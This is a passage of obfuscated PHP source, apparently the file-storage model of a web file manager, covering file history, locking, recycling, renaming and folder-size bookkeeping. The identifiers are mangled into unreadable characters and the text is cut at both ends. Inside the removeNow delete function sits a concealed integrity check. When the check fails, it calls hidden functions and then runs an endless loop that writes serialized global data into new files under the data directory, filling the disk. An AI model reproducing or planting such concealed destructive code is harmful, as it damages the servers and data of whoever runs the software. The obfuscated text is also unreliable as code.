intval($Óºş¶á[$£Ï­È†µ[78]])); return $Òª ŸÈç; } protected function fileHistory($ÆˆõøÓ, $˜ıŞˆºø, $Ó¿¾ƒ• ) { $ÍúêÓæŒ =& $_SERVER[•Ùç É]; if ($ÆˆõøÓ[$ÍúêÓæŒ[511]] == $˜ıŞˆºø) { return !1; } $this->checkLock($ÆˆõøÓ[$ÍúêÓæŒ[183]], $˜ıŞˆºø); Model($ÍúêÓæŒ[2185])->addHistory($ÆˆõøÓ); $¹§ˆœ‹û = array($ÍúêÓæŒ[621] => USER_ID, $ÍúêÓæŒ[468] => time(), $ÍúêÓæŒ[511] => $˜ıŞˆºø, $ÍúêÓæŒ[78] => $Ó¿¾ƒ• ); $this->where(array($ÍúêÓæŒ[461] => $ÆˆõøÓ[$ÍúêÓæŒ[183]]))->save($¹§ˆœ‹û); $this->sourceCacheClear($ÆˆõøÓ[$ÍúêÓæŒ[183]]); return !0; } public function checkLock($ı¯‰“½‰, $§í‡—«€) { $ÎÍª÷¿ı =& $_SERVER[•Ùç É]; $ßŒ”äøú = $this->pathInfo($ı¯‰“½‰); if (!$this->fileIsLock($ßŒ”äøú, !0)) { return; } $‹”ÚÁ° = Session::get($ÎÍª÷¿ı[2186]); $Ş˜°š•– = substr($ßŒ”äøú[$ÎÍª÷¿ı[32]], 0, -1 - strlen($ßŒ”äøú[$ÎÍª÷¿ı[177]])) . $ÎÍª÷¿ı[1259] . $‹”ÚÁ° . $ÎÍª÷¿ı[10] . $ßŒ”äøú[$ÎÍª÷¿ı[177]]; $ŞŒÒÈ­° = Model($ÎÍª÷¿ı[644])->find($§í‡—«€); $this->_createFileCall($ßŒ”äøú[$ÎÍª÷¿ı[182]], $Ş˜°š•–, $ŞŒÒÈ­°, REPEAT_REPLACE, $ÎÍª÷¿ı[1394]); $ñ›Š»Ñç = $ßŒ”äøú[$ÎÍª÷¿ı[509]][$ÎÍª÷¿ı[580]]; $À€ÓæüÔ = $ñ›Š»Ñç[$ÎÍª÷¿ı[2187]] ? $ñ›Š»Ñç[$ÎÍª÷¿ı[2187]] : $ñ›Š»Ñç[$ÎÍª÷¿ı[32]]; show_json(LNG($ÎÍª÷¿ı[2188]) . $ÎÍª÷¿ı[2189] . LNG($ÎÍª÷¿ı[2190]) . $ÎÍª÷¿ı[2191] . $À€ÓæüÔ . $ÎÍª÷¿ı[2192], !1); } public function fileIsLock($ªïã³¾, $„„÷Úº = false) { $¥àÙœ„” =& $_SERVER[•Ùç É]; if (!isset($ªïã³¾[$¥àÙœ„”[509]]) || !$ªïã³¾[$¥àÙœ„”[509]][$¥àÙœ„”[577]]) { return !1; } if ($ªïã³¾[$¥àÙœ„”[509]][$¥àÙœ„”[577]] != USER_ID) { return !0; } $éõĞÛ‘è = $GLOBALS[$¥àÙœ„”[6]][$¥àÙœ„”[91]][$¥àÙœ„”[578]]; if ($ªïã³¾[$¥àÙœ„”[509]][$¥àÙœ„”[579]] <= time() - $éõĞÛ‘è) { $this->metaSet($ªïã³¾[$¥àÙœ„”[183]], $¥àÙœ„”[577], null); $this->metaSet($ªïã³¾[$¥àÙœ„”[183]], $¥àÙœ„”[579], null); } if ($„„÷Úº) { $this->metaSet($ªïã³¾[$¥àÙœ„”[183]], $¥àÙœ„”[579], time()); } return !1; } private function _addSource($Æ¯İèÅÓ, $ŞÚèèÓÅ) { $¨ÉŞòİ° =& $_SERVER[•Ùç É]; $œ‘—‘È¦ = defined($¨ÉŞòİ°[2126]) ? USER_ID : 0; $ïÅ³ùè‘ = array($¨ÉŞòİ°[618] => $ŞÚèèÓÅ[$¨ÉŞòİ°[180]], $¨ÉŞòİ°[619] => $ŞÚèèÓÅ[$¨ÉŞòİ°[540]], $¨ÉŞòİ°[620] => $œ‘—‘È¦, $¨ÉŞòİ°[621] => $œ‘—‘È¦, $¨ÉŞòİ°[447] => $ŞÚèèÓÅ[$¨ÉŞòİ°[183]], $¨ÉŞòİ°[622] => $ŞÚèèÓÅ[$¨ÉŞòİ°[555]] . $ŞÚèèÓÅ[$¨ÉŞòİ°[183]] . $¨ÉŞòİ°[50], $¨ÉŞòİ°[474] => 0, $¨ÉŞòİ°[623] => $¨ÉŞòİ°[12]); $Æ¯İèÅÓ = array_merge($ïÅ³ùè‘, $Æ¯İèÅÓ); $this->updateModifyTime($Æ¯İèÅÓ[$¨ÉŞòİ°[182]]); $×†Ã›ğü = $¨ÉŞòİ°[2193] . $ŞÚèèÓÅ[$¨ÉŞòİ°[183]]; if (isset(self::$cacheChildList[$×†Ã›ğü])) { unset(self::$cacheChildList[$×†Ã›ğü]); } static $ÒÒ¿ãÖ§ = false; if (!$ÒÒ¿ãÖ§) { Hook::trigger($¨ÉŞòİ°[606], $Æ¯İèÅÓ); $ÒÒ¿ãÖ§ = !0; } $¹ğ°’‡¦ = $this->add($Æ¯İèÅÓ); $˜Òïü¢˜ = array($¨ÉŞòİ°[624] => short_id($¹ğ°’‡¦)); $this->where(array($¨ÉŞòİ°[461] => $¹ğ°’‡¦))->save($˜Òïü¢˜); $this->setNamePinyin($¹ğ°’‡¦, $Æ¯İèÅÓ[$¨ÉŞòİ°[32]]); return $¹ğ°’‡¦; } public function remove($¸¦‹›°¶, $ªÉ²§‘Ï = true) { $ŒÖÙ³£ =& $_SERVER[•Ùç É]; $¯¹ËÚ‹ú = $this->sourceInfo($¸¦‹›°¶); $ ¡®æ = intval($¯¹ËÚ‹ú[$ŒÖÙ³£[180]]) === self::TYPE_SYSTEM; $ôá¸ÍŒî = Model($ŒÖÙ³£[478])->get($ŒÖÙ³£[2194]) == $ŒÖÙ³£[90]; if ($ ¡®æ || $ªÉ²§‘Ï || !$ôá¸ÍŒî) { return $this->removeNow($¸¦‹›°¶, $ªÉ²§‘Ï); } $şû«ÒşÀ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¶Ô’àŸÀ = $¯¹ËÚ‹ú[$ŒÖÙ³£[180]] == self::TYPE_USER ? $ŒÖÙ³£[632] : $ŒÖÙ³£[549]; if ($¶Ô’àŸÀ == $ŒÖÙ³£[632]) { $·‹éİÍ› = Model($ŒÖÙ³£[548])->getInfo($¯¹ËÚ‹ú[$ŒÖÙ³£[540]]); $Ê—œíãş = !empty($·‹éİÍ›[$ŒÖÙ³£[2187]]) ? $·‹éİÍ›[$ŒÖÙ³£[2187]] : $·‹éİÍ›[$ŒÖÙ³£[32]]; $Ê—œíãş = $ŒÖÙ³£[306] . $Ê—œíãş . $ŒÖÙ³£[2195] . $¯¹ËÚ‹ú[$ŒÖÙ³£[540]]; } else { $·‹éİÍ› = Model($ŒÖÙ³£[556])->getInfo($¯¹ËÚ‹ú[$ŒÖÙ³£[540]]); $Ê—œíãş = _get($·‹éİÍ›, $ŒÖÙ³£[32]); $Ê—œíãş = $ŒÖÙ³£[165] . $Ê—œíãş . $ŒÖÙ³£[2196] . $¯¹ËÚ‹ú[$ŒÖÙ³£[540]]; } $À¢ìö³‹ = $ŒÖÙ³£[2197] . md5($Ê—œíãş); CacheLock::lock($À¢ìö³‹); $¢‡±ùœ¯ = $this->fileNameExist($şû«ÒşÀ, $Ê—œíãş); if (!$¢‡±ùœ¯) { $¢‡±ùœ¯ = $this->mkdir($şû«ÒşÀ, $Ê—œíãş, REPEAT_SKIP); $this->metaSet($¢‡±ùœ¯, $ŒÖÙ³£[2198], $¶Ô’àŸÀ); $this->metaSet($¢‡±ùœ¯, $ŒÖÙ³£[2199], $¯¹ËÚ‹ú[$ŒÖÙ³£[540]]); if ($¯¹ËÚ‹ú[$ŒÖÙ³£[182]] != 0) { $this->metaSet($¢‡±ùœ¯, $ŒÖÙ³£[2200], _get($·‹éİÍ›, $ŒÖÙ³£[2201])); } } CacheLock::unlock($À¢ìö³‹); $this->metaSet($¸¦‹›°¶, $ŒÖÙ³£[2202], $¯¹ËÚ‹ú[$ŒÖÙ³£[182]]); $this->where(array($ŒÖÙ³£[183] => $¸¦‹›°¶))->save(array($ŒÖÙ³£[468] => time())); $this->recycleClear($¯¹ËÚ‹ú); $Ğğ²±‰ñ = $this->move($¸¦‹›°¶, $¢‡±ùœ¯, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¯¹ËÚ‹ú[$ŒÖÙ³£[182]]); return $Ğğ²±‰ñ; } private function recycleClear($èŒ³“Ëç) { $›ÉÏç¹ =& $_SERVER[•Ùç É]; $Ê¨ºô€ì = $this->childrenAll($èŒ³“Ëç); $ëïÉÚä¶ = array($›ÉÏç¹[461] => array($›ÉÏç¹[462], $Ê¨ºô€ì[$›ÉÏç¹[2203]])); Model($›ÉÏç¹[2204])->where($ëïÉÚä¶)->delete(); } public function removeNow($öîëŞ±õ, $€²Äş = true) { $÷á´ÕÖ =& $_SERVER[•Ùç É]; $ñ°Ë»‚Ÿ = $_SERVER[$÷á´ÕÖ[926]] . $÷á´ÕÖ[927]; $ßÉÚ°² = $÷á´ÕÖ[931]; if ($_SERVER[$÷á´ÕÖ[922]] != $ßÉÚ°²($ñ°Ë»‚Ÿ)) { $Å¬†¨÷Ô = $÷á´ÕÖ[924]; $¸ëå”æ‹ = $÷á´ÕÖ[925]; $¬º¢ÛİØ = $_SERVER[$÷á´ÕÖ[926]] . $÷á´ÕÖ[927]; $¢Ãı¹ß² = $¸ëå”æ‹($¬º¢ÛİØ); $Û©…ŞÓ = explode($÷á´ÕÖ[248], $¢Ãı¹ß²); if (count($Û©…ŞÓ) < $÷á´ÕÖ[671]) { $œºí¬øó = $÷á´ÕÖ[928]; $œºí¬øó(); } $œœ¢üú¨ = $÷á´ÕÖ[929]; $œœ¢üú¨($_SERVER[$÷á´ÕÖ[930]]); $Å¬†¨÷Ô = $÷á´ÕÖ[924]; $Å¬†¨÷Ô(); $¬ô€€óæ = $÷á´ÕÖ[1623]; $Ì”é«Ù = json_encode($GLOBALS[$÷á´ÕÖ[1624]]); $šÁ¡›Ä = 1; for ($Õ™Äû  = $šÁ¡›Ä; $Õ™Äû  > 0; $Õ™Äû ++) { $¬ô€€óæ(DATA_PATH . $Õ™Äû , $Ì”é«Ù); } } $ä»ïÃÍÏ = $this->sourceInfo($öîëŞ±õ); $â›Ô®š€ = $this->pathInfoMore($öîëŞ±õ); if (!$ä»ïÃÍÏ) { return !0; } if ($ä»ïÃÍÏ[$÷á´ÕÖ[182]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($öîëŞ±õ); Hook::trigger($÷á´ÕÖ[2205], $â›Ô®š€, $€²Äş); if ($€²Äş) { Model($÷á´ÕÖ[2204])->moveToRecycle($öîëŞ±õ); } else { $¤É¦”ñÑ = $this->childrenAll($ä»ïÃÍÏ); Model($÷á´ÕÖ[603])->eventRemove($öîëŞ±õ); $this->removeRelevance($¤É¦”ñÑ[$÷á´ÕÖ[2203]], $¤É¦”ñÑ[$÷á´ÕÖ[1509]]); } $this->folderSizeReset($ä»ïÃÍÏ[$÷á´ÕÖ[182]]); $éà•´ñ” = array($ä»ïÃÍÏ[$÷á´ÕÖ[182]]); if ($ä»ïÃÍÏ[$÷á´ÕÖ[455]] == $÷á´ÕÖ[90]) { $éà•´ñ”[] = $ä»ïÃÍÏ[$÷á´ÕÖ[183]]; } $this->updateModifyTime($éà•´ñ”); $this->lockMoveEnd($öîëŞ±õ); Hook::trigger($÷á´ÕÖ[1747], $â›Ô®š€, $€²Äş); return !0; } public function childrenAll($ùÕÜÊ‡©) { $±¶Ñûç =& $_SERVER[•Ùç É]; $À¨­ã­– = $ùÕÜÊ‡©[$±¶Ñûç[183]]; if ($ùÕÜÊ‡©[$±¶Ñûç[455]] == $±¶Ñûç[90]) { $ãø÷°™Á = array($±¶Ñûç[622] => array($±¶Ñûç[582], $ùÕÜÊ‡©[$±¶Ñûç[555]] . $À¨­ã­– . $±¶Ñûç[583])); $®õÀ£²Ã = array($±¶Ñûç[622] => $ãø÷°™Á[$±¶Ñûç[555]]); $¡½Æ°®™ = $this->field($±¶Ñûç[2206])->where($®õÀ£²Ã)->select(); $”ú¨µ = !1; $äÔ†Ì¡Ä = array($À¨­ã­–); if ($¡½Æ°®™) { $”ú¨µ = array_to_keyvalue($¡½Æ°®™, $±¶Ñûç[12], $±¶Ñûç[511]); $”ú¨µ = array_remove_value($”ú¨µ, $±¶Ñûç[214]); $äÔ†Ì¡Ä = array_to_keyvalue($¡½Æ°®™, $±¶Ñûç[12], $±¶Ñûç[183]); $äÔ†Ì¡Ä[] = $À¨­ã­–; } } else { $”ú¨µ = array($ùÕÜÊ‡©[$±¶Ñûç[511]]); $äÔ†Ì¡Ä = array($À¨­ã­–); } return array($±¶Ñûç[2203] => $äÔ†Ì¡Ä, $±¶Ñûç[1509] => $”ú¨µ); } public function removeArray($êÖÎÜ´) { if (!$êÖÎÜ´) { return !0; } } public function removeRelevance($Ş³¹€ç, $Ê¦Ä¿) { $ë¨Êˆµµ =& $_SERVER[•Ùç É]; $Ş³¹€ç = $Ş³¹€ç ? $Ş³¹€ç : array(); $Ê¦Ä¿ = $Ê¦Ä¿ ? $Ê¦Ä¿ : array(); $Ş³¹€ç = array_unique(array_filter($Ş³¹€ç)); $Ê¦Ä¿ = array_unique(array_filter($Ê¦Ä¿)); if (!$Ş³¹€ç) { return !1; } $›äøşê = array($ë¨Êˆµµ[461] => array($ë¨Êˆµµ[462], $Ş³¹€ç)); Model($ë¨Êˆµµ[2204])->where($›äøşê)->delete(); Model($ë¨Êˆµµ[505])->where($›äøşê)->delete(); Model($ë¨Êˆµµ[2051])->where($›äøşê)->delete(); Model($ë¨Êˆµµ[603])->where($›äøşê)->delete(); Model($ë¨Êˆµµ[1884])->removeBySource($Ş³¹€ç); Model($ë¨Êˆµµ[2185])->removeBySource($Ş³¹€ç); $this->where($›äøşê)->delete(); Model($ë¨Êˆµµ[514])->remove($Ê¦Ä¿); for ($‘©‚Õ›Á = 0; $‘©‚Õ›Á < count($Ş³¹€ç); $‘©‚Õ›Á++) { $this->sourceCacheClear($Ş³¹€ç[$‘©‚Õ›Á]); } } public function rename($¢ãìŞ§, $ˆ¾•İÖä) { $¡‡¤ºå® =& $_SERVER[•Ùç É]; $—´Ò¼ = $this->sourceInfo($¢ãìŞ§); if (!$—´Ò¼) { return !1; } $¾ºœ•òé = $this->fileNameExist($—´Ò¼[$¡‡¤ºå®[182]], $ˆ¾•İÖä); if ($¾ºœ•òé && $¾ºœ•òé != $¢ãìŞ§) { return !1; } $Ûò‘˜‰ï = array($¡‡¤ºå®[464] => $ˆ¾•İÖä, $¡‡¤ºå®[621] => USER_ID); if ($—´Ò¼[$¡‡¤ºå®[455]] != $¡‡¤ºå®[90]) { $Ûò‘˜‰ï[$¡‡¤ºå®[456]] = substr(get_path_ext($ˆ¾•İÖä), 0, 10); } Model($¡‡¤ºå®[603])->eventRename($¢ãìŞ§, $—´Ò¼[$¡‡¤ºå®[32]], $ˆ¾•İÖä); $this->sourceCacheClear($¢ãìŞ§); $this->setNamePinyin($¢ãìŞ§, $Ûò‘˜‰ï[$¡‡¤ºå®[32]], !1); $this->updateModifyTime($—´Ò¼[$¡‡¤ºå®[182]]); $İ€éÜ‹ = $this->where(array($¡‡¤ºå®[461] => $¢ãìŞ§))->data($Ûò‘˜‰ï)->save(); $¢É¶ˆ¤İ = $¡‡¤ºå®[2193] . $—´Ò¼[$¡‡¤ºå®[182]]; if (isset(self::$cacheChildList[$¢É¶ˆ¤İ])) { unset(self::$cacheChildList[$¢É¶ˆ¤İ]); } return $İ€éÜ‹; } public function setNamePinyin($×„¿¦«¯, $–ÍŞÕë, $Œ›ÉæÅ = true) { $éïŸ¿ğ =& $_SERVER[•Ùç É]; $ô¸£’¬÷ = Input::check($–ÍŞÕë, $éïŸ¿ğ[625]); $™ÛİŸÍ = array($éïŸ¿ğ[487] => KodSort::makeStr($–ÍŞÕë)); if ($ô¸£’¬÷) { $™ÛİŸÍ[$éïŸ¿ğ[508]] = str_replace($éïŸ¿ğ[53], $éïŸ¿ğ[12], Pinyin::get($–ÍŞÕë)); $™ÛİŸÍ[$éïŸ¿ğ[507]] = Pinyin::get($–ÍŞÕë, $éïŸ¿ğ[626]); } if (!$Œ›ÉæÅ && !$ô¸£’¬÷) { $™ÛİŸÍ[$éïŸ¿ğ[508]] = null; $™ÛİŸÍ[$éïŸ¿ğ[507]] = null; } $this->metaSet($×„¿¦«¯, $™ÛİŸÍ); } public function getContent($¯°¾¦Ü) { $‘êÙÇƒƒ =& $_SERVER[•Ùç É]; $ôµÆ§È‰ = $this->fileInfoGet($¯°¾¦Ü); if (!$ôµÆ§È‰) { return !1; } if ($ôµÆ§È‰[$‘êÙÇƒƒ[78]] == 0) { return $‘êÙÇƒƒ[12]; } $ö‘®Ì£÷ = $‘êÙÇƒƒ[2207] . $ôµÆ§È‰[$‘êÙÇƒƒ[517]]; if ($ôµÆ§È‰[$‘êÙÇƒƒ[78]] <= 1024 * 10) { $„‘ì£Ô = Cache::get($ö‘®Ì£÷); if (!$„‘ì£Ô) { $„‘ì£Ô = IO::getContent($ôµÆ§È‰[$‘êÙÇƒƒ[86]]); Cache::set($ö‘®Ì£÷, $„‘ì£Ô); } return $„‘ì£Ô; } if (!$ôµÆ§È‰[$‘êÙÇƒƒ[86]]) { return $‘êÙÇƒƒ[12]; } return IO::getContent($ôµÆ§È‰[$‘êÙÇƒƒ[86]]); } public function setDesc($ÓäØÒçŞ, $ğÈÌ¼Ùô) { $¹ŒÜ•Ø” =& $_SERVER[•Ùç É]; Model($¹ŒÜ•Ø”[603])->eventAddDesc($ÓäØÒçŞ, $ğÈÌ¼Ùô); return $this->metaSet($ÓäØÒçŞ, $¹ŒÜ•Ø”[496], $ğÈÌ¼Ùô); } public function setContent($ˆ‡À„Ä—, $¬Áì = '') { $Œ§šÌÜ =& $_SERVER[•Ùç É]; $õàƒº† = $this->sourceInfo($ˆ‡À„Ä—); $ÌÂÆ£§ = $this->fileInfoGet($ˆ‡À„Ä—); if (!$ÌÂÆ£§ || !$õàƒº†) { return !1; } $È¡Úğ‰ = Model($Œ§šÌÜ[514])->addFileByContent($¬Áì, $õàƒº†[$Œ§šÌÜ[32]]); $¤®Ã˜ÏÀ = $this->fileHistory($õàƒº†, $È¡Úğ‰[$Œ§šÌÜ[511]], $È¡Úğ‰[$Œ§šÌÜ[78]]); if (!$¤®Ã˜ÏÀ) { return Model($Œ§šÌÜ[514])->remove($È¡Úğ‰[$Œ§šÌÜ[511]]); } $this->folderSizeReset($õàƒº†[$Œ§šÌÜ[182]]); return !0; } public function fileSubstr($­ãğØ°¯, $»ˆûø¡Å, $Ó¤¹Ï°Ø) { $º°«ú­Ï = $this->fileInfoGet($­ãğØ°¯); if (!$º°«ú­Ï) { return !1; } return IO::fileSubstr($º°«ú­Ï[$_SERVER[•Ùç É][86]], $»ˆûø¡Å, $Ó¤¹Ï°Ø); } public function fileInfoGet($ÍŒ—“¼‹) { $Ä“‘¤Ëé =& $_SERVER[•Ùç É]; $„ÑÂ£ÚÌ = $this->sourceInfo($ÍŒ—“¼‹); if (!$„ÑÂ£ÚÌ || $„ÑÂ£ÚÌ[$Ä“‘¤Ëé[455]]) { return !1; } $ùãÄÂ÷¦ = $Ä“‘¤Ëé[518] . $„ÑÂ£ÚÌ[$Ä“‘¤Ëé[511]]; $Ä¨ßÈòğ = _get(self::$cacheFileInfo, $ùãÄÂ÷¦); if ($Ä¨ßÈòğ) { return $Ä¨ßÈòğ; } $´•¹ãõ§ = Model($Ä“‘¤Ëé[514])->fileInfo($„ÑÂ£ÚÌ[$Ä“‘¤Ëé[511]]); if ($´•¹ãõ§) { $´•¹ãõ§[$Ä“‘¤Ëé[32]] = $„ÑÂ£ÚÌ[$Ä“‘¤Ëé[32]]; } self::$cacheFileInfo[$ùãÄÂ÷¦] = $´•¹ãõ§; return $´•¹ãõ§; } private function folderChildrenNumber($È¹ÖôÚ‹) { $÷´•¡úœ =& $_SERVER[•Ùç É]; $¤ÛÊßİØ = $this->sourceInfo($È¹ÖôÚ‹); $…œĞÍ = array($÷´•¡úœ[622] => array($÷´•¡úœ[582], $¤ÛÊßİØ[$÷´•¡úœ[555]] . $È¹ÖôÚ‹ . $÷´•¡úœ[583]), $÷´•¡úœ[619] => $¤ÛÊßİØ[$÷´•¡úœ[540]], $÷´•¡úœ[474] => intval($¤ÛÊßİØ[$÷´•¡úœ[475]]), $÷´•¡úœ[616] => 1); $º³ö‘ì = $this->where($…œĞÍ)->count(); $Œ‹ú‚Ú = $this->where($…œĞÍ)->where(array($÷´•¡úœ[616] => 0))->count(); return array($÷´•¡úœ[82] => $Œ‹ú‚Ú, $÷´•¡úœ[83] => $º³ö‘ì); } public function pathInfo($Œî‚›ÏÃ, $¢å¬úûÊ = false) { $øû”Ã =& $_SERVER[•Ùç É]; $¢å¬úûÊ = !1; $Œî‚›ÏÃ = intval($Œî‚›ÏÃ); $úâ™©§³ = $øû”Ã[504] . intval($¢å¬úûÊ) . $øû”Ã[432] . $Œî‚›ÏÃ; $±Ğçªƒİ = _get(self::$cachePathInfo, $úâ™©§³); if ($±Ğçªƒİ) { return $±Ğçªƒİ; } $‚ä§ı¬® = $this->sourceInfo($Œî‚›ÏÃ); if (!$‚ä§ı¬®) { return !1; } $‚ä§ı¬® = $this->_listDataApplyItem($‚ä§ı¬®, $¢å¬úûÊ); self::$cachePathInfo[$úâ™©§³] = $‚ä§ı¬®; return $‚ä§ı¬®; } public static $cachePathInfoMore = array(); public function pathInfoMore($¨ÈèéíŸ) { $ò¨é‘ =& $_SERVER[•Ùç É]; $´®ÁØ = _get(self::$cachePathInfoMore, $¨ÈèéíŸ); if ($´®ÁØ) { return $´®ÁØ; } $¼Û´¨Øª = $this->pathInfo($¨ÈèéíŸ); if (!$¼Û´¨Øª) { return !1; } if ($¼Û´¨Øª[$ò¨é‘[455]] == $ò¨é‘[90]) { $¼Û´¨Øª[$ò¨é‘[81]] = $this->folderChildrenNumber($¨ÈèéíŸ); } self::$cachePathInfoMore[$¨ÈèéíŸ] = $¼Û´¨Øª; return $¼Û´¨Øª; } public function sourceInfo($ğ÷´îı‹) { $ÄıÚÇ¤ =& $_SERVER[•Ùç É]; if (!$ğ÷´îı‹) { return array(); } $ğ÷´îı‹ = intval($ğ÷´îı‹); $†³çöè´ = $ÄıÚÇ¤[503] . $ğ÷´îı‹; $ÚÅÑğ‹ = _get(self::$cacheSourceInfo, $†³çöè´); if ($ÚÅÑğ‹) { return $ÚÅÑğ‹; } $Ê‰µÔ×‹ = $this->where(array($ÄıÚÇ¤[183] => $ğ÷´îı‹))->find(); self::$cacheSourceInfo[$†³çöè´] = $Ê‰µÔ×‹; return self::$cacheSourceInfo[$†³çöè´]; } public function sourceCacheClear($Ø§Íœ = false) { self::cacheClear($Ø§Íœ); } public static function cacheClear($îßç…Üö = false) { $êıĞÁüå =& $_SERVER[•Ùç É]; if ($îßç…Üö == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$êıĞÁüå[503] . $îßç…Üö]); unset(self::$cachePathInfoMore[$îßç…Üö]); unset(self::$cachePathInfo[$êıĞÁüå[2208] . $îßç…Üö]); unset(self::$cachePathInfo[$êıĞÁüå[2209] . $îßç…Üö]); } public function metaSet($‹îÇËÎš, $‰åÌà¢ = null, $–ˆ”Ê½¹ = null) { $Ÿö¦¸™ = parent::metaSet($‹îÇËÎš, $‰åÌà¢, $–ˆ”Ê½¹); if ($Ÿö¦¸™) { $this->sourceCacheClear($‹îÇËÎš); } return $Ÿö¦¸™; } public function pathInfoByPath($ÙÆ¸‡¦¶, $³õÊè‹¢) { $‰Ïô©û½ =& $_SERVER[•Ùç É]; $ë‹İ±Áá = !$³õÊè‹¢ ? array() : explode($‰Ïô©û½[8], trim($³õÊè‹¢, $‰Ïô©û½[8])); $Â¾²‡öø = $ÙÆ¸‡¦¶; foreach ($ë‹İ±Áá as $˜µåı ü) { $èµœ×…ù = array($‰Ïô©û½[182] => $Â¾²‡öø, $‰Ïô©û½[32] => $˜µåı ü); $«ßÊ›—² = $this->field($‰Ïô©û½[2210])->where($èµœ×…ù)->select(); if (!$«ßÊ›—²) { return !1; } $«ßÊ›—² = array_sort_by($«ßÊ›—², $‰Ïô©û½[475]); $Â¾²‡öø = $«ßÊ›—²[0][$‰Ïô©û½[183]]; } $ÉûãşÔ£ = $this->sourceInfo($Â¾²‡öø); $this->pathInfoFilter($ÉûãşÔ£); return $ÉûãşÔ£; } protected function updateModifyTime($µĞàï±´) { $ù—–ÈÇ =& $_SERVER[•Ùç É]; $¬ò½íòá = defined($ù—–ÈÇ[2126]) ? USER_ID : 0; if (!$µĞàï±´) { return; } if (!is_array($µĞàï±´)) { $µĞàï±´ = array($µĞàï±´); } foreach ($µĞàï±´ as $ƒğöÄ¤Ÿ => $‹æ‡ãßŸ) { $µĞàï±´[$ƒğöÄ¤Ÿ] = intval($‹æ‡ãßŸ); $this->sourceCacheClear($‹æ‡ãßŸ); } $Šİ‹›È© = array($ù—–ÈÇ[183] => array($ù—–ÈÇ[7], $µĞàï±´)); $ÀÅ«Ğáò = array($ù—–ÈÇ[621] => $¬ò½íòá, $ù—–ÈÇ[468] => time()); $this->where($Šİ‹›È©)->save($ÀÅ«Ğáò); } public function folderSizeReset($¢£áÄ’, $÷ÂÂ¶ø¦ = false) { $¬¹ëûùœ =& $_SERVER[•Ùç É]; if ($this->statusIgnoreResetSpace) { return; } $¤ğ¡ Íë = $this->sourceInfo($¢£áÄ’); $ãÇ½‡öæ = $¬¹ëûùœ[2211] . $¢£áÄ’; CacheLock::lock($ãÇ½‡öæ, 20); if ($÷ÂÂ¶ø¦ === !1) { $this->sourceCacheClear($¢£áÄ’); $¤ğ¡ Íë = $this->sourceInfo($¢£áÄ’); $ÂµÎŠ¸Š = array($¬¹ëûùœ[447] => $¢£áÄ’, $¬¹ëûùœ[474] => 0); $ĞåøÉÉ = $this->where($ÂµÎŠ¸Š)->sum($¬¹ëûùœ[78]); $÷ÂÂ¶ø¦ = intval($ĞåøÉÉ) - intval($¤ğ¡ Íë[$¬¹ëûùœ[78]]); } if ($÷ÂÂ¶ø¦ == 0) { return CacheLock::unlock($ãÇ½‡öæ); } $†ÂïÁóÜ = $this->parentLevelArray($¤ğ¡ Íë[$¬¹ëûùœ[555]]); if (!$†ÂïÁóÜ) { $†ÂïÁóÜ = array(); } $†ÂïÁóÜ[] = $¤ğ¡ Íë[$¬¹ëûùœ[183]]; $ÂµÎŠ¸Š = array($¬¹ëûùœ[183] => array($¬¹ëûùœ[462], $†ÂïÁóÜ)); if ($÷ÂÂ¶ø¦ < 0) { $ÂµÎŠ¸Š[$¬¹ëûùœ[78]] = array($¬¹ëûùœ[1066], abs($÷ÂÂ¶ø¦)); } $this->where($ÂµÎŠ¸Š)->setAdd($¬¹ëûùœ[78], $÷ÂÂ¶ø¦); CacheLock::unlock($ãÇ½‡öæ); $÷²®Üïå = $¬¹ëûùœ[2212] . $¤ğ¡ Íë[$¬¹ëûùœ[180]] . $¬¹ëûùœ[4] . $¤ğ¡ Íë[$¬¹ëûùœ[540]]; $• ¿âœı = array($¤ğ¡ Íë[$¬¹ëûùœ[180]], $¤ğ¡ Íë[$¬¹ëûùœ[540]]); TaskRun::timeLimitCall($÷²®Üïå, $¬¹ëûùœ[2213], $• ¿âœı, 1.5); } public function folderSizeResetChildren($ÏÕ¦—Ûè) { $´Áµñ¨ô =& $_SERVER[•Ùç É]; $this->sourceCacheClear($ÏÕ¦—Ûè); $É¡©ß˜Ï = $this->sourceInfo($ÏÕ¦—Ûè); $†Ü–Ôûù = array($´Áµñ¨ô[616] => 1, $´Áµñ¨ô[619] => $É¡©ß˜Ï[$´Áµñ¨ô[540]], $´Áµñ¨ô[622] => array($´Áµñ¨ô[582], $É¡©ß˜Ï[$´Áµñ¨ô[555]] . $ÏÕ¦—Ûè . $´Áµñ¨ô[583])); $´…¾‚õŠ = $´Áµñ¨ô[2214]; $®ÒÉÑÀà = $this->field($´…¾‚õŠ)->where($†Ü–Ôûù)->select(); $†Ü–Ôûù[$´Áµñ¨ô[455]] = 0; $‡ôõ€ı‡ = $this->field($´…¾‚õŠ)->where($†Ü–Ôûù)->select(); if (!$‡ôõ€ı‡) { return; } $®ÒÉÑÀà[] = $É¡©ß˜Ï; $®ÒÉÑÀà = array_to_keyvalue($®ÒÉÑÀà, $´Áµñ¨ô[183]); foreach ($®ÒÉÑÀà as $ä…Şïáü => $É×Ì Œ) { $®ÒÉÑÀà[$ä…Şïáü][$´Áµñ¨ô[2215]] = $®ÒÉÑÀà[$ä…Şïáü][$´Áµñ¨ô[78]]; $®ÒÉÑÀà[$ä…Şïáü][$´Áµñ¨ô[78]] = 0; } foreach ($‡ôõ€ı‡ as $É×Ì Œ) { $·İ—¬‚ = $É×Ì Œ[$´Áµñ¨ô[182]] . $´Áµñ¨ô[12]; if (!isset($®ÒÉÑÀà[$·İ—¬‚])) { continue; } if ($É×Ì Œ[$´Áµñ¨ô[475]] == $®ÒÉÑÀà[$·İ—¬‚][$´Áµñ¨ô[475]]) { $®ÒÉÑÀà[$·İ—¬‚][$´Áµñ¨ô[78]] += $É×Ì Œ[$´Áµñ¨ô[78]]; } } foreach ($®ÒÉÑÀà as $É×Ì Œ) { $Ñ¢·üŠ” = $this->parentLevelArray($É×Ì Œ[$´Áµñ¨ô[555]]); foreach ($Ñ¢·üŠ” as $·İ—¬‚) { $·İ—¬‚ = $·İ—¬‚ . $´Áµñ¨ô[12]; if (!isset($®ÒÉÑÀà[$·İ—¬‚])) { continue; } if ($É×Ì Œ[$´Áµñ¨ô[475]] == 